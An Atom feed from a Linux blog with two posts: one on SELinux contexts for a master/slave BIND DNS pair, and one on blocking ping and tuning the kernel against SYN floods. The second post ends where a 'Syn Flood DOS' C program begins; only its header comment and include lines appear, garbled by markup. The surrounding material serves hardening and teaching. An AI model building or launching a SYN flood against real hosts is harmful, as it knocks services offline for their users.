<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: linux-security | Lin's linux blog]]></title>
  <link href="http://lin-credible.github.io/blog/categories/linux-security/atom.xml" rel="self"/>
  <link href="http://lin-credible.github.io/"/>
  <updated>2013-05-08T18:14:17+08:00</updated>
  <id>http://lin-credible.github.io/</id>
  <author>
    <name><![CDATA[Taolinran]]></name>
    <email><![CDATA[linuxtaolinran@gmail.com]]></email>
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[DNS and SELinux]]></title>
    <link href="http://lin-credible.github.io/blog/2013/05/08/dns-and-selinux/"/>
    <updated>2013-05-08T16:10:00+08:00</updated>
    <id>http://lin-credible.github.io/blog/2013/05/08/dns-and-selinux</id>
    <content type="html"><![CDATA[<h1>Nice SELinux</h1>

<p><img src="/images/selinux-penguin-new_medium.png" alt="alt text" /><br /></p>

<h2>SELinux introduction</h2>

<p><a href="http://wiki.centos.org/HowTos/SELinux">CentOS Wiki about SELinux</a><br /></p>

<!-- more -->


<p><img src="/images/SELinux_Decision_Process.png" alt="alt text" /><br /></p>

<h2>My Test Environment</h2>

<p><img src="/images/selinux_and_dns.jpg" alt="alt text" /><br />
<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>192.168.10.112/master - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'> <span class="o">[</span><span class="n">root</span><span class="err">@</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">master_192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>  <span class="n">etc</span><span class="o">]</span><span class="err">$</span> <span class="n">uname</span> <span class="o">-</span><span class="n">srvmpio</span>
</span><span class='line'> <span class="no">Linux</span> <span class="mi">2</span><span class="o">.</span><span class="mi">6</span><span class="o">.</span><span class="mi">32</span><span class="o">-</span><span class="mi">279</span><span class="o">.</span><span class="mi">14</span><span class="o">.</span><span class="mi">1</span><span class="o">.</span><span class="n">el6</span><span class="o">.</span><span class="n">x86_64</span> <span class="c1">#1 SMP Tue Nov 6 23:43:09 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux</span>
</span><span class='line'> <span class="o">[</span><span class="n">root</span><span class="err">@</span><span class="o">&lt;</span><span class="sr">/em&gt;master_192.168.10.112  etc]$ cat /e</span><span class="n">tc</span><span class="o">/</span><span class="n">issue</span>
</span><span class='line'> <span class="no">CentOS</span> <span class="n">release</span> <span class="mi">6</span><span class="o">.</span><span class="mi">3</span> <span class="p">(</span><span class="no">Final</span><span class="p">)</span>
</span><span class='line'> <span class="no">Kernel</span> <span class="p">\</span><span class="n">r</span> <span class="n">on</span> <span class="n">an</span> <span class="p">\</span><span class="n">m</span>
</span><span class='line'> <span class="o">[</span><span class="n">root</span><span class="err">@</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">master_192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>  <span class="n">etc</span><span class="o">]</span><span class="err">$</span> <span class="n">getenforce</span>      <span class="o">&lt;</span><span class="n">br</span><span class="o">/&gt;</span>
</span><span class='line'> <span class="no">Enforcing</span>
</span><span class='line'> <span class="o">[</span><span class="n">root</span><span class="err">@</span><span class="o">&lt;</span><span class="sr">/em&gt;master_192.168.10.112  etc]$ named -version</span>
</span><span class='line'><span class="sr"> BIND 9.8.2rc1-RedHat-9.8.2-0.17.rc1.el6_4.4</span>
</span><span class='line'><span class="sr"> [root@_master_192.168.10.112  etc]$ dig txt chaos version.bind.</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p><strong><em>Slave 192.168.10.111 is the same configuration.</em></strong>
The test is based on <a href="http://lin-credible.github.io/blog/2013/04/25/master-slash-slave-dns-server-base-on-tsig/?=241520525">my previous done</a></p>

<h2>named_selinux</h2>

<p><code>
man 8 named_selinux
</code></p>

<h3>File context</h3>

<h4>named_conf_t</h4>

<p>```
Set files with the named_conf_t type, if you want to treat the files as named configuration data,
usually stored under the /etc directory.</p>

<p>Paths:</p>

<pre><code>/var/named/chroot/etc/named.root.hints,     /var/named/chroot(/.*)?,      /var/named/named.ca,
/etc/unbound(/.*)?,                       /var/named/chroot/etc/named.caching-nameserver.conf,
/etc/named.root.hints,  /var/named/chroot/etc/named.rfc1912.zones,   /etc/named.rfc1912.zones,
/etc/named.caching-nameserver.conf,   /etc/named.conf,   /var/named/chroot/var/named/named.ca,
/var/named/chroot/etc/named.conf, /etc/rndc.*
</code></pre>

<p>```</p>

<h4>named_zone_t</h4>

<p>```
Set files with the named_zone_t type, if you want to treat the files as named zone data.</p>

<p>Paths:</p>

<pre><code>/var/named/chroot/var/named(/.*)?, /var/named(/.*)?
</code></pre>

<p>```
......</p>

<h3>master</h3>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>192.168.10.112/master - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'> <span class="o">[</span><span class="n">root</span><span class="err">@</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">master_192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>  <span class="n">etc</span><span class="o">]</span><span class="err">$</span> <span class="n">pwd</span>
</span><span class='line'> <span class="sr">/var/n</span><span class="n">amed</span><span class="o">/</span><span class="n">chroot</span><span class="o">/</span><span class="n">etc</span>
</span><span class='line'> <span class="o">[</span><span class="n">root</span><span class="err">@</span><span class="o">&lt;</span><span class="sr">/em&gt;master_192.168.10.112  etc]$ ls -Z named.conf</span>
</span><span class='line'><span class="sr"> -rw-r--r--. root named system_u:object_r:named_conf_t:s0 named.conf</span>
</span><span class='line'><span class="sr"> [root@_master_192.168.10.112  etc]$ ls -Z ../</span><span class="n">var</span><span class="o">/</span><span class="n">named</span><span class="o">/*</span>
</span><span class='line'> <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span> <span class="n">named</span> <span class="n">named</span> <span class="n">system_u</span><span class="ss">:object_r:named_zone_t:s0</span> <span class="o">.</span><span class="n">.</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">named</span><span class="o">/</span><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="n">zone</span>
</span><span class='line'> <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span> <span class="n">named</span> <span class="n">named</span> <span class="n">system_u</span><span class="ss">:object_r:named_zone_t:s0</span> <span class="o">.</span><span class="n">.</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">named</span><span class="o">/</span><span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="n">zone</span>
</span><span class='line'> <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span> <span class="n">named</span> <span class="n">named</span> <span class="n">system_u</span><span class="ss">:object_r:named_conf_t:s0</span> <span class="o">.</span><span class="n">.</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">named</span><span class="o">/</span><span class="n">named</span><span class="o">.</span><span class="n">ca</span>
</span><span class='line'> <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span> <span class="n">named</span> <span class="n">named</span> <span class="n">system_u</span><span class="ss">:object_r:named_zone_t:s0</span> <span class="o">.</span><span class="n">.</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">named</span><span class="o">/</span><span class="n">wondershare</span><span class="o">.</span><span class="n">cn</span><span class="o">.</span><span class="n">lan10</span>
</span><span class='line'> <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span> <span class="n">named</span> <span class="n">named</span> <span class="n">system_u</span><span class="ss">:object_r:named_zone_t:s0</span> <span class="o">.</span><span class="n">.</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">named</span><span class="o">/</span><span class="n">wondershare</span><span class="o">.</span><span class="n">cn</span><span class="o">.</span><span class="n">lan192</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<h4>Change the zone file's serial number(add) and reload the named.</h4>

<h3>Slave</h3>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>192.168.10.112/master - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'> <span class="o">[</span><span class="n">root</span><span class="err">@</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">slave_192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">111</span>  <span class="n">etc</span><span class="o">]</span><span class="err">$</span> <span class="n">pwd</span>
</span><span class='line'> <span class="sr">/var/n</span><span class="n">amed</span><span class="o">/</span><span class="n">chroot</span><span class="o">/</span><span class="n">etc</span>
</span><span class='line'> <span class="o">[</span><span class="n">root</span><span class="err">@</span><span class="o">&lt;</span><span class="sr">/em&gt;slave_192.168.10.111  etc]$ ls -Z named.conf</span>
</span><span class='line'><span class="sr"> -rw-r-----. root named system_u:object_r:named_conf_t:s0 named.conf</span>
</span><span class='line'><span class="sr"> [root@_slave_192.168.10.111  etc]$ ls -Z ../</span><span class="n">var</span><span class="o">/</span><span class="n">named</span><span class="o">/</span><span class="n">slaves</span><span class="o">/</span>
</span><span class='line'> <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span> <span class="n">named</span> <span class="n">named</span> <span class="n">unconfined_u</span><span class="ss">:object_r:named_cache_t:s0</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="n">zone</span>
</span><span class='line'> <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span> <span class="n">named</span> <span class="n">named</span> <span class="n">unconfined_u</span><span class="ss">:object_r:named_cache_t:s0</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="n">zone</span>
</span><span class='line'> <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span> <span class="n">named</span> <span class="n">named</span> <span class="n">unconfined_u</span><span class="ss">:object_r:named_cache_t:s0</span> <span class="n">wondershare</span><span class="o">.</span><span class="n">cn</span><span class="o">.</span><span class="n">lan10</span>
</span><span class='line'> <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span> <span class="n">named</span> <span class="n">named</span> <span class="n">unconfined_u</span><span class="ss">:object_r:named_cache_t:s0</span> <span class="o">.</span><span class="n">/wondershare</span><span class="o">.</span><span class="n">cn</span><span class="o">.</span><span class="n">lan192</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<h4>Now, check the zone file's serial number. The slave's zone files just changed. It's different from the former test.??</h4>

<h3>Look</h3>

<p><img src="/images/named_write_master_zones.jpg" alt="alt text" /><br /></p>

<h5>mine here.</h5>

<p><code>
[root@_master_192.168.10.112  named]$ getsebool -a |grep named
named_write_master_zones --&gt; off
[root@_slave_192.168.10.111  slaves]$ getsebool -a |grep named
named_write_master_zones --&gt; off
</code></p>

<h3>I do nothing, but enable the SELinux. And the name service just is still nice!</h3>

<h2>Make a change.</h2>

<p><code>
[root@_master_192.168.10.112  named]$ getsebool -a |grep named
named_write_master_zones --&gt; off
[root@_master_192.168.10.112  named]$ setsebool -P named_write_master_zones 1
[root@_master_192.168.10.112  named]$ getsebool -a |grep named               
named_write_master_zones --&gt; on
</code></p>

<h3>The M/S name servers still run well.</h3>

<h4>Futher more ......</h4>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[The Art of Banning Ping Command and SYN Flood]]></title>
    <link href="http://lin-credible.github.io/blog/2013/05/07/the-art-of-banning-ping-command/"/>
    <updated>2013-05-07T10:07:00+08:00</updated>
    <id>http://lin-credible.github.io/blog/2013/05/07/the-art-of-banning-ping-command</id>
    <content type="html"><![CDATA[<h2>1. The theory of ping.</h2>

<p><img src="/images/ping.jpg" alt="alt text" /><br /></p>

<h2>2. kernel about</h2>

<h3>help doc</h3>

<p><div class='bogus-wrapper'><notextile><figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>yum install -y kernel-doc.noarch
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<!-- more -->


<p>kernel-doc.noarch : Various documentation bits found in the kernel source</p>

<h3>/proc/sys/net/ipv4/</h3>

<h4>My test environment</h4>

<p><img src="/images/ping_art.jpg" alt="alt text" /><br /></p>

<h4>test prepare</h4>

<p>Show IP Address in prompt
<div class='bogus-wrapper'><notextile><figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">export </span><span class="nv">PS1</span><span class="o">=</span><span class="s2">&quot;[\u@&lt;code&gt;hostname -I&lt;/code&gt; \W]$ &quot;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>
Show Internet IP Address in prompt
<div class='bogus-wrapper'><notextile><figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">export </span><span class="nv">PS1</span><span class="o">=</span><span class="s2">&quot;[\u@&lt;code&gt;curl ifconfig.me&lt;/code&gt; \W]$ &quot;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>
or here, It's faster.
<div class='bogus-wrapper'><notextile><figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">export </span><span class="nv">PS1</span><span class="o">=</span><span class="s2">&quot;[\u@&lt;code&gt;curl icanhazip.com&lt;/code&gt; \W]$ &quot;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<h4>2.1 icmp_echo_ignore_all</h4>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>192.168.10.78/default - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'><span class="n">echo</span> <span class="mi">0</span> <span class="o">&gt;</span> <span class="sr">/proc/s</span><span class="n">ys</span><span class="o">/</span><span class="n">net</span><span class="o">/</span><span class="n">ipv4</span><span class="o">/</span><span class="n">icmp_echo_ignore_all</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>
<img src="/images/ping/icmp_echo_ignore_all_0.jpg" alt="alt text" /><br />
<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>192.168.10.78 - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'><span class="n">echo</span> <span class="mi">1</span> <span class="o">&gt;</span> <span class="sr">/proc/s</span><span class="n">ys</span><span class="o">/</span><span class="n">net</span><span class="o">/</span><span class="n">ipv4</span><span class="o">/</span><span class="n">icmp_echo_ignore_all</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>
<img src="/images/ping/icmp_echo_ignore_all_1.jpg" alt="alt text" /><br /></p>

<h4>2.2 icmp_echo_ignore_broadcasts</h4>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>192.168.10.78 - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'><span class="n">echo</span> <span class="mi">0</span> <span class="o">&gt;</span><span class="sr">/proc/s</span><span class="n">ys</span><span class="o">/</span><span class="n">net</span><span class="o">/</span><span class="n">ipv4</span><span class="o">/</span><span class="n">icmp_echo_ignore_broadcasts</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>
<div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>192.168.10.112/ping - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'><span class="o">[</span><span class="n">root</span><span class="err">@</span><span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span>  <span class="o">/]</span><span class="vg">$ping</span> <span class="o">-</span><span class="n">b</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">255</span>
</span><span class='line'><span class="o">.</span><span class="n">.</span><span class="o">.</span><span class="n">.</span><span class="o">.</span><span class="n">.</span>
</span><span class='line'><span class="mi">64</span> <span class="n">bytes</span> <span class="n">from</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">78</span><span class="p">:</span> <span class="n">icmp_seq</span><span class="o">=</span><span class="mi">51</span> <span class="n">ttl</span><span class="o">=</span><span class="mi">128</span> <span class="n">time</span><span class="o">=</span><span class="mi">0</span><span class="o">.</span><span class="mi">565</span> <span class="n">ms</span>
</span><span class='line'><span class="o">.</span><span class="n">.</span><span class="o">.</span><span class="n">.</span><span class="o">.</span><span class="n">.</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>
if set <strong><em>1</em></strong>, there is no reply.<br /></p>

<h4>2.3 ip_default_ttl</h4>

<p>...</p>

<h4>2.4 ip_local_port_range</h4>

<p>...
......</p>

<h2>3. iptables</h2>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>iptables - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'><span class="n">iptables</span> <span class="o">-</span><span class="n">A</span> <span class="no">INPUT</span> <span class="o">-</span><span class="n">s</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">111</span> <span class="o">-</span><span class="nb">p</span> <span class="n">icmp</span> <span class="o">-</span><span class="n">j</span> <span class="no">DROP</span>
</span><span class='line'><span class="n">iptables</span> <span class="o">-</span><span class="n">A</span> <span class="no">INPUT</span> <span class="o">-</span><span class="n">s</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">111</span> <span class="o">-</span><span class="nb">p</span> <span class="n">icmp</span> <span class="o">-</span><span class="n">j</span> <span class="no">REJECT</span>
</span><span class='line'><span class="n">iptables</span> <span class="o">-</span><span class="n">t</span> <span class="n">filter</span> <span class="o">-</span><span class="n">A</span> <span class="no">INPUT</span> <span class="o">-</span><span class="n">S</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">111</span> <span class="o">-</span><span class="nb">p</span> <span class="n">icmp</span> <span class="o">-</span><span class="n">j</span> <span class="no">REJECT</span> <span class="o">--</span><span class="n">reject</span><span class="o">-</span><span class="n">with</span> <span class="n">icmp</span><span class="o">-</span><span class="n">host</span><span class="o">-</span><span class="n">unreachable</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>
They are different, try it!</p>

<h2>4. SYN Flood Test</h2>

<h3>Kernel about</h3>

<p><code>
cat /usr/share/doc/kernel-doc-2.6.32/Documentation/networking/ip-sysctl.txt
</code></p>

<h4>tcp_fin_timeout</h4>

<p>```
tcp_fin_timeout - INTEGER</p>

<pre><code>    Time to hold socket in state FIN-WAIT-2, if it was closed
    by our side. Peer can be broken and never close its side,
    or even died unexpectedly. Default value is 60sec.
    Usual value used in 2.2 was 180 seconds, you may restore
    it, but remember that if your machine is even underloaded WEB server,
    you risk to overflow memory with kilotons of dead sockets,
    FIN-WAIT-2 sockets are less dangerous than FIN-WAIT-1,
    because they eat maximum 1.5K of memory, but they tend
    to live longer. Cf. tcp_max_orphans.
</code></pre>

<p>```</p>

<h4>tcp_max_syn_backlog</h4>

<p>```
tcp_max_syn_backlog - INTEGER</p>

<pre><code>    Maximal number of remembered connection requests, which have not
    received an acknowledgment from connecting client.
    The minimal value is 128 for low memory machines, and it will
    increase in proportion to the memory of machine.
    If server suffers from overload, try increasing this number.
</code></pre>

<p>```</p>

<h4>tcp_syn_retries</h4>

<p>```
tcp_syn_retries - INTEGER</p>

<pre><code>    Number of times initial SYNs for an active TCP connection attempt
    will be retransmitted. Should not be higher than 255. Default value
    is 5, which corresponds to ~180seconds.
</code></pre>

<p>```</p>

<h4>tcp_syncookies</h4>

<p>```
tcp_syncookies - BOOLEAN</p>

<pre><code>    Only valid when the kernel was compiled with CONFIG_SYNCOOKIES
    Send out syncookies when the syn backlog queue of a socket
    overflows. This is to prevent against the common 'SYN flood attack'
    Default: FALSE

    Note, that syncookies is fallback facility.
    It MUST NOT be used to help highly loaded servers to stand
    against legal connection rate. If you see SYN flood warnings
    in your logs, but investigation shows that they occur
    because of overload with legal connections, you should tune
    another parameters until this warning disappear.
    See: tcp_max_syn_backlog, tcp_synack_retries, tcp_abort_on_overflow.

    syncookies seriously violate TCP protocol, do not allow
    to use TCP extensions, can result in serious degradation
    of some services (f.e. SMTP relaying), visible not by you,
    but your clients and relays, contacting you. While you see
    SYN flood warnings in logs not being really flooded, your server
    is seriously misconfigured.
</code></pre>

<p>```</p>

<h4>tcp_synack_retries</h4>

<p>```
tcp_synack_retries - INTEGER</p>

<pre><code>    Number of times SYNACKs for a passive TCP connection attempt will
    be retransmitted. Should not be higher than 255. Default value
    is 5, which corresponds to ~180seconds.
</code></pre>

<p>```</p>

<h3>SYN Flood Test DOS Attack with C Source Code (Linux)</h3>

<p><div class='bogus-wrapper'><notextile><figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cm">/*&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="cm">&lt;pre&gt;&lt;code&gt;Syn Flood DOS with LINUX sockets</span>
</span><span class='line'><span class="cm">&lt;/code&gt;&lt;/pre&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="cm">&lt;p&gt;*/</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span> <span class="c1">//memset&lt;/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">sys</span><span class="o">/</span><span class="n">socket</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
